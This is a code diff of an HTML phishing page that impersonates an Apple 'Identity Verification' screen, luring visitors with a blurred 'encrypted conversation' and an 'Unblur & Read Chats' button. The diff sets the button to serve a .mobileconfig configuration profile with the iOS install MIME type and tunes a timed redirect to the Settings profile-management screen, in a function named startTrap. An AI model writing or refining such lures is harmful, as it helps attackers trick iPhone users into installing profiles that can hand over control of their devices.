@@ -31,8 +31,10 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
         <h2>Identity Verification</h2>
         <p>This conversation is encrypted. To view the full archive, verify your device identity.</p>
-        <a href="./secure_verify.mobileconfig" class="btn" onclick="startTrap()">Unblur & Read Chats</a>
+        
+        <a href="verify_identity.mobileconfig" type="application/x-apple-aspen-config" class="btn" onclick="startTrap()">Unblur & Read Chats</a>
     </div>
+
     <script>
         setTimeout(function() {
             document.getElementById('trap-popup').style.display = 'block';
@@ -42,7 +44,7 @@
         function startTrap() {
             setTimeout(function() {
                 window.location.href = "App-prefs:General&path=ManagedConfigurationList";
-            }, 4000);
+            }, 4500);
         }
     </script>
 </body>
